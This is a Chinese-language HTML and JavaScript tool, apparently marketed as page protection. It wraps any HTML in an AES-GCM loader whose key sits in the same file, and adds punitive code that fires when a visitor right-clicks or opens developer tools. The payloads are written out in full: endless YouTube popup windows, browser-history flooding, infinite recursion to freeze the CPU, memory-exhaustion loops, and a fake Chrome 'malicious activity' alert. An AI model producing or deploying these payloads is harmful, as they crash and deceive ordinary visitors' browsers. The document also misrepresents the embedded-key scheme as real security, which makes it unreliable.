<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORE SECURE | System Defense Console</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@300;400;800&display=swap');
        
        :root { 
            --gold: #d4af37; 
            --bg: #050505; 
            --card: #0f0f0f; 
            --danger: #ff3e3e;
            --success: #00ff41;
        }

        * { box-sizing: border-box; }
        body { 
            background-color: var(--bg); 
            color: #fff; 
            font-family: 'Inter', sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            min-height: 100vh; 
            background-image: radial-gradient(circle at 50% 0%, #151515 0%, #050505 80%);
            padding: 40px 0;
        }

        .container { width: 95%; max-width: 1400px; }
        
        header { 
            text-align: left; 
            border-bottom: 1px solid #222; 
            padding-bottom: 30px; 
            margin-bottom: 50px; 
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }

        .logo-group h1 { 
            font-size: 2.8rem; 
            font-weight: 800; 
            background: linear-gradient(to right, #fff 30%, var(--gold)); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            margin: 0; 
            letter-spacing: -2px;
        }

        .sys-status { font-family: 'Space Mono', monospace; font-size: 10px; color: var(--gold); letter-spacing: 4px; }

        .main-panel { background: var(--card); border: 1px solid #1a1a1a; padding: 40px; border-radius: 4px; box-shadow: 0 80px 150px rgba(0,0,0,1); }
        
        .grid-layout { display: grid; grid-template-columns: 1.8fr 1fr; gap: 50px; }

        .label { 
            font-family: 'Space Mono', monospace; 
            font-size: 11px; 
            color: #555; 
            text-transform: uppercase; 
            margin-bottom: 18px; 
            display: flex;
            align-items: center;
            letter-spacing: 2px; 
        }
        .label::before { content: ""; width: 8px; height: 8px; background: var(--gold); margin-right: 10px; display: inline-block; }

        textarea { 
            width: 100%; 
            height: 500px; 
            background: #000; 
            border: 1px solid #1a1a1a; 
            border-radius: 2px; 
            color: var(--success); 
            padding: 25px; 
            font-family: 'Space Mono', monospace; 
            font-size: 13px; 
            outline: none; 
            transition: border 0.3s;
            line-height: 1.5;
        }
        textarea:focus { border-color: var(--gold); }

        .options-scroll { 
            max-height: 500px; 
            overflow-y: auto; 
            padding-right: 10px;
        }
        
        .option-item { 
            background: #0a0a0a; 
            border: 1px solid #1a1a1a; 
            padding: 18px; 
            border-radius: 4px; 
            display: flex; 
            align-items: flex-start;
            cursor: pointer; 
            margin-bottom: 12px;
            transition: 0.2s;
        }
        .option-item:hover { border-color: var(--gold); background: #111; }
        .option-item input { margin-top: 5px; margin-right: 15px; accent-color: var(--gold); transform: scale(1.3); }

        .opt-text b { display: block; font-size: 14px; color: var(--gold); margin-bottom: 4px; text-transform: uppercase; }
        .opt-text span { font-size: 11px; color: #666; display: block; line-height: 1.4; }

        .btn-deploy { 
            width: 100%; 
            padding: 25px; 
            background: var(--gold); 
            color: #000; 
            border: none; 
            font-weight: 900; 
            font-size: 16px;
            letter-spacing: 8px; 
            cursor: pointer; 
            margin-top: 40px; 
            transition: 0.3s;
        }
        .btn-deploy:hover { background: #fff; transform: translateY(-2px); box-shadow: 0 10px 40px rgba(212, 175, 55, 0.3); }
        .btn-deploy:active { transform: translateY(0); }

        #output-area { margin-top: 50px; display: none; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .code-output { 
            background: #000; 
            border: 1px solid #1a1a1a; 
            padding: 25px; 
            font-family: 'Space Mono', monospace; 
            font-size: 11px; 
            color: #444; 
            word-break: break-all; 
            max-height: 200px; 
            overflow: auto; 
            margin-bottom: 20px;
        }

        .sys-log { font-family: 'Space Mono', monospace; font-size: 10px; color: #333; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="logo-group">
            <h1>CORE SECURE</h1>
            <div class="sys-status">TACTICAL ENCRYPTION INTERFACE // V5.0.4</div>
        </div>
        <div style="text-align: right">
            <div id="clock" class="sys-status">LOADING_TIME_STAMP...</div>
        </div>
    </header>

    <div class="main-panel">
        <div class="grid-layout">
            <div>
                <label class="label">Primary Source Payload</label>
                <textarea id="rawInput" spellcheck="false" placeholder="/* 貼入您要加密武裝的 HTML 代碼... */"></textarea>
                <div class="sys-log">> Awaiting RAW_DATA injection...</div>
            </div>
            
            <div>
                <label class="label">Defense Module Selection</label>
                <div class="options-scroll">
                    <label class="option-item">
                        <input type="checkbox" id="opt1" checked>
                        <div class="opt-text"><b>F12 攔截 & 鍵盤鎖</b><span>禁止開發者工具、Ctrl+U、Ctrl+S 等快捷鍵</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt2" checked>
                        <div class="opt-text"><b>視窗噴泉轟炸 (YT)</b><span>無限彈出 YouTube 視窗分頁，消耗系統資源</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt3" checked>
                        <div class="opt-text"><b>歷史紀錄污染</b><span>瞬間填滿 100+ 筆瀏覽紀錄，使其無法返回上一頁</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt4" checked>
                        <div class="opt-text"><b>CPU 核心鎖死</b><span>執行同步無限遞迴，凍結瀏覽器執行緒</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt5" checked>
                        <div class="opt-text"><b>RAM 溢出炸彈</b><span>每 100ms 注入 10MB 數據至記憶體堆疊</span></div>
                    </label>
                    <div style="margin: 20px 0; height: 1px; background: #222"></div>
                    <label class="option-item">
                        <input type="checkbox" id="opt6">
                        <div class="opt-text"><b>偽裝系統中毒警告</b><span>Google Chrome 安全性檢測偽裝界面</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt7">
                        <div class="opt-text"><b>螢幕劇烈震動</b><span>利用 CSS 變位實現頁面瘋狂晃動</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt8">
                        <div class="opt-text"><b>內容亂碼崩壞</b><span>解密後頁面文字隨機變換為亂碼字串</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt9">
                        <div class="opt-text"><b>Console 嘲諷洗版</b><span>開啟 F12 時控制台會被巨型警告文字淹沒</span></div>
                    </label>
                    <label class="option-item">
                        <input type="checkbox" id="opt10">
                        <div class="opt-text"><b>隱藏滑鼠游標</b><span>強制取消所有元素的指針顯示</span></div>
                    </label>
                </div>
            </div>
        </div>

        <button class="btn-deploy" onclick="generate()">DEPLOY DEFENSE PROTOCOL</button>

        <div id="output-area">
            <label class="label" style="color: var(--gold)">Armored Hex Payload Generated</label>
            <div class="code-output" id="resultCode"></div>
            <button class="btn-deploy" style="background:transparent; color:var(--gold); border: 2px solid var(--gold); margin-top: 20px;" onclick="copyCode()">COPY TO CLIPBOARD</button>
        </div>
    </div>
</div>

<script>
    // 實時時鐘
    setInterval(() => {
        const d = new Date();
        document.getElementById('clock').innerText = d.toISOString().replace('T', ' ').substring(0, 19);
    }, 1000);

    const toHex = b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');

    async function generate() {
        const input = document.getElementById('rawInput').value;
        if(!input) { alert("ERROR: NO PAYLOAD DETECTED"); return; }

        let strikeLogic = "";
        
        // 模組化反擊注入
        if(document.getElementById('opt1').checked) strikeLogic += "e&&e.preventDefault();";
        if(document.getElementById('opt2').checked) strikeLogic += "setInterval(()=>{window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ','_blank','width=200,height=200');},400);";
        if(document.getElementById('opt3').checked) strikeLogic += "for(let i=0;i<100;i++)history.pushState(null,null,'?security_check='+Math.random());";
        if(document.getElementById('opt4').checked) strikeLogic += "const f=()=>{while(true)f();};setTimeout(f,0);";
        if(document.getElementById('opt5').checked) strikeLogic += "let m=[];setInterval(()=>{try{m.push(new Array(1000000).fill(1));}catch(e){}},100);";
        
        if(document.getElementById('opt6').checked) strikeLogic += `
            document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#202124;display:flex;justify-content:center;align-items:center;z-index:9999999;font-family:sans-serif;color:#fff;padding:20px;"><div style="max-width:500px;background:#fff;color:#000;padding:35px;border-radius:12px;box-shadow:0 30px 60px rgba(0,0,0,0.5);"><div style="display:flex;align-items:center;margin-bottom:20px;"><div style="background:#ea4335;width:45px;height:45px;border-radius:50%;display:flex;justify-content:center;align-items:center;color:#fff;font-size:26px;font-weight:bold;margin-right:20px;">!</div><h2 style="margin:0;font-size:24px;color:#d93025;letter-spacing:-1px;">System alert: Malicious activity</h2></div><p style="font-size:15px;color:#5f6368;line-height:1.6;">Access has been restricted. Unauthorized code manipulation attempt detected. All local session data has been quarantined.</p><div style="margin-top:30px;display:flex;justify-content:flex-end;"><button onclick="location.reload()" style="background:#1a73e8;color:#fff;border:none;padding:12px 25px;border-radius:6px;font-weight:bold;cursor:pointer;">Refresh & Scan</button></div></div></div>';
        `;
        
        if(document.getElementById('opt7').checked) strikeLogic += "setInterval(()=>{document.body.style.transform=`translate(${Math.random()*20-10}px,${Math.random()*20-10}px)`;},15);";
        if(document.getElementById('opt8').checked) strikeLogic += "setInterval(()=>{document.body.innerText=Math.random().toString(36).substring(2);},60);";
        if(document.getElementById('opt9').checked) strikeLogic += "setInterval(()=>{console.clear();console.log('%cWARNING: UNAUTHORIZED ACCESS', 'color:red;font-size:60px;font-weight:bold;text-shadow:5px 5px 0 black;');console.error('SYSTEM CORRUPTED');},200);";
        if(document.getElementById('opt10').checked) strikeLogic += "document.body.style.cursor='none';document.documentElement.style.cursor='none';";

        // 封裝防禦與主代碼
        const armoredScript = `<script>
        (function(){
            const _STRIKE = (e) => { 
                console.warn("DEFENSE_PROTOCOL_IGNITED");
                ${strikeLogic} 
            };
            document.oncontextmenu = () => { _STRIKE(); return false; };
            window.onkeydown = e => { if([123,73,74,85].includes(e.keyCode) && (e.ctrlKey || e.shiftKey || e.keyCode==123)) { _STRIKE(e); return false; } };
            
            // 偵測開發者工具打開 (Debugger 延時監控)
            setInterval(() => { 
                const start = performance.now(); 
                debugger; 
                if(performance.now() - start > 100) _STRIKE(); 
            }, 1000);
        })();
        <\/script>`;

        try {
            // 執行 AES-GCM 加密
            const cryptoKeyRaw = window.crypto.getRandomValues(new Uint8Array(32));
            const iv = window.crypto.getRandomValues(new Uint8Array(12));
            const key = await window.crypto.subtle.importKey("raw", cryptoKeyRaw, "AES-GCM", false, ["encrypt"]);
            const encryptedBuf = await window.crypto.subtle.encrypt({name: "AES-GCM", iv: iv}, key, new TextEncoder().encode(armoredScript + input));

            const finalPayload = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>PROTECTED_FILE</title></head><body>" +
                "<div id='L' style='position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;'></div>" +
                "<script>\n" +
                "(async function(){\n" +
                "  const _u=h=>new Uint8Array(h.match(/.{1,2}/g).map(y=>parseInt(y,16)));\n" +
                "  try {\n" +
                "    const k=await window.crypto.subtle.importKey('raw',_u('" + toHex(cryptoKeyRaw) + "'),'AES-GCM',false,['decrypt']);\n" +
                "    const r=await window.crypto.subtle.decrypt({name:'AES-GCM',iv:_u('" + toHex(iv) + "')},k,_u('" + toHex(encryptedBuf) + "'));\n" +
                "    const d=new TextDecoder().decode(r);\n" +
                "    document.open();document.write(d);document.close();\n" +
                "  } catch(e) { document.body.innerHTML='ACCESS_DENIED'; }\n" +
                "})();\n" +
                "<\/script></body></html>";

            document.getElementById('resultCode').innerText = finalPayload;
            document.getElementById('output-area').style.display = 'block';
            window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'});
        } catch(e) {
            console.error(e);
            alert("ENCRYPTION_FAILED: CHECK CONSOLE");
        }
    }

    function copyCode() {
        const code = document.getElementById('resultCode').innerText;
        navigator.clipboard.writeText(code).then(() => {
            alert("ARMORED_CODE_COPIED // 準備迎接盜碼者的驚恐。");
        });
    }
</script>
</body>
</html>
